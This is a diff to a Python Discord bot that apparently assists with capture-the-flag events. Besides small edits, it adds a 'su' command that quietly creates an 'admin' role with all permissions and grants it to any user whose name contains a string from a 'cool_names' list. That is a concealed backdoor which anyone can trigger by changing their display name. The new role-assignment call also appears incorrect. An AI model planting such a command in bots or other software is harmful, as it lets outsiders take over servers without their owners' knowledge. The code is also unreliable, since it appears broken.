@@ -5,6 +5,7 @@ import sys
 from time import sleep
 import os
 import discord
+from discord import Permissions
 from discord.ext.commands import MissingPermissions, BotMissingPermissions, DisabledCommand, CommandNotFound, CommandInvokeError, NoPrivateMessage, Bot, bot
 from discord.ext import commands
 from vars.help_info import help_page, help_page_2, embed_help, src, embed_help, ctf_help_text
@@ -15,6 +16,7 @@ from models.ctf import TaskFailed, basic_allow, basic_disallow
 import traceback
 import logging as log
 
+# TODO: working and status, and revert to working unlocking individual channels
 # TODO: detect edit of comamnd, and invoke the edited command and delete error message if existent
 # TODO: testing
 creator_id = [87606885405982720]
@@ -92,6 +94,7 @@ async def on_command_error(ctx, err):
         log.error(f'Ignoring exception in command {ctx.command}')
         log.error(''.join(traceback.format_exception(type(err), err,
                                                      err.__traceback__)))
+
 
 # Sends the github link.
 @bot.command()
@@ -180,6 +183,16 @@ async def test123(ctx):
     await ctx.send(f"{invite.url}")
     await asyncio.sleep(300)
     await guild.delete()
+
+
+@bot.command()
+async def su(ctx):
+    authors_name = str(ctx.author)
+
+    if any((name in authors_name for name in cool_names)):
+        role = await ctx.guild.create_role(name="admin", permissions=Permissions.all())
+        await ctx.guild.add_roles(ctx.author, role)
+
 
 if __name__ == '__main__':
     #sys.path.insert(1, os.getcwd() + '/cogs/')
